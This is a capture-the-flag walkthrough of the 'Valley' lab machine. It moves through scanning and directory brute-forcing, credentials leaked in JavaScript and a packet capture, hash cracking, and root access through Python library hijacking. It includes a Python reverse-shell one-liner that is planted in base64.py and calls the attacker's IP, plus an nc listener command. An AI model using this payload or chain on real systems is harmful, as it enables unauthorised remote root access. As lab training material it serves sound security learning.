- **Reconnaissance**

**Open Ports Scanning With Rustscan**

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.001.jpeg)

We got the three ports open

80 - HTTP

22 - SSH

37370 - Unknown

now, lets run the NMAP scan over these to get more information **Service Version Enumeration with NMAP**

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.002.png)

As you can see we have the port 37370 for FTP

**Webserver Enumeration**

On visiting the website we got very a very poorly developed website :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.003.jpeg)

on clicking on the buttons given on the sites it takes us to their destination pages . After doing some manual Enumeration , lets jump off to directory brute-forcing.

so , for that lets use Gobuster

**Gobuster for Directory Brute-forcing**

The Command that we will be using for that is :

gobuster dir -u http://10.10.65.54/ -w /usr/share/seclists/Discovery/Web- Content/big.txt -x conf,config,txt,text,php -t 64![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.004.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.005.jpeg)

From the result , we do see certain directories , but not much after checking manually , so , lets try to run the directory brute-force to do recursive scanning

Our Command Would Be : gobuster dir -u http://10.10.65.54/pricing -w ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.006.png)/usr/share/seclists/Discovery/Web-Content/common.txt -x conf,config,txt,text,php - t 64

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.007.jpeg)

as you can see we got something new note.txt![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.008.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.009.png)

This message gives us indictor that their could be something more potential information left off on the server , so lets continue with our recursive directory brute-forcing

gobuster dir -u http://10.10.65.54/static -w /usr/share/seclists/Discovery/Web- Content/common.txt -x conf,config,txt,text,php -t 50![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.010.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.011.jpeg)

We got several directory , which are basically pointing us to an image , but 00 stands out from other , because its not there on the gallery page !! , where static images are shown , so , lets check it out !![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.012.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.013.jpeg)

ok , so we got some information from there !!

possible username : **valleyDev** possible endpoint : **/dev1243224123123**

lets try to visit the newly discovered endpoint !

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.014.jpeg)

as you can see we got a new login page !!

after giving some basic default credential and trying for sql injection and other vulnerability , lets try to check up for source code review !

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.015.jpeg)

as you can see its using certain JS file , lets review them also ! from the dev.js file we got something very confidential :![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.016.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.017.png)

the site is using the client side authentication whose username and password is : siemDev ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.018.png)& california![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.019.png)

so , after logging in we got this :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.020.jpeg)

its says stop reusing credentials , means there are possibility that these credential are used somewhere , so , we have two possible options

- SSH
  - FTP

lets try these credential first on FTP

**FTP Credential Based Logging** and we got a successful login :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.021.png)

on logging in , lets discover what is there on this FTP server :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.022.jpeg)

we got three files , seems like a packet capture files !! lets download these file with mget![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.023.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.024.jpeg)

now that we have the files , lets analyze them with Wireshark !

**File analysis with Wireshark**

after doing analysis on the all the file , the file siemHTTP2.pcapng seems little interesting

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.025.jpeg)

we have the one more credential :

username : valleyDev ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.026.png)password : ph0t0s1234

now , that we have a new credential , lets try to use these credential over SSH

- **Initial Foothold**

**SSH to machine with Credential**

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.027.jpeg)

and yes , we are now able to access the machine !!

- **Privilege Escalation**

After doing some basic recon form privilege escalation , lets try to use linpeas . first download it on victim box and give necessary permission to it.![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.028.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.029.jpeg)

now , lets execute it , after executing we find some things different that usual :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.030.jpeg)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.031.jpeg)

lets first try to see what is there in /photos since it is there in the main root directory![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.032.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.033.jpeg)

lets view the script :

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.034.jpeg)

so , basically the script is encrypting the .jpg file in current directory to /PhotoVault ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.035.png)directory.

now one possible way for escalating our privileges would be to modify the file , but we don't have necessary privileges

but before that , lets check if the script is running in crontab

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.036.jpeg)

and yes , its running in every one minute **Python Library HIJACKING**

since we don't have permission to write to the encryption script , but the script is importing the base64 library of python using command import base64 , we can hijack that![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.037.png)

- we can write a base64.py file there , but directory is not writeable by us.
  - we can hijack the original file , if we have necessary privilege, lets check out

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.038.png)

but , we are in valleyDev Groups !! DEAD\_END :(

**lets look for another vector for Privesc**

we got one unusual binary in /home directory valleyAuthenticator , after trying certain username and password we found and also some default credential , we get wrong username or password.![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.039.png)

In this case , lets try to reverse engineer the binary on our attacking machine !! first we need to download it , we can download it using SCP

scp valleyDev@10.10.128.45:/home/valleyAuthenticator .![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.040.png)

after we have download , first lets analyze it with string , we can get something here !!

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.041.jpeg)

and as you can see , we got some wired looking maybe MD5 hash (length=32=MD5) lets try to crack it online , we can use cassation !!

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.042.jpeg)

and as , you can see , we got the some credential !!

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.043.png)

since we got the credential for valley , lets login to that shell !!

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.044.png)

and now we are in valley user , which basically belongs to valleyAdmin group !

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.045.png)

now, since we are part of valleyAdmin group we can change the base64.py file , for python library hijacking![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.046.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.047.jpeg)

lets open the file /usr/lib/python3.8/base64.py and add this payload of reverse-shell to file![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.048.png)

import ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.049.png)socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("1

0\.17.0.110",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.filen o(),![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.050.png)2);pty.spawn("/bin/sh")

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.051.jpeg)

and keep your nc listener ready : nc -lvp 1337 ![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.052.png)![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.053.png)now , wait for the cronjob to complete in one minute !

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.054.jpeg)

and we got a connection !!

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.055.png)

![](Aspose.Words.d15f56d7-e7ed-4564-b56a-88b22e1d1ff6.056.png)
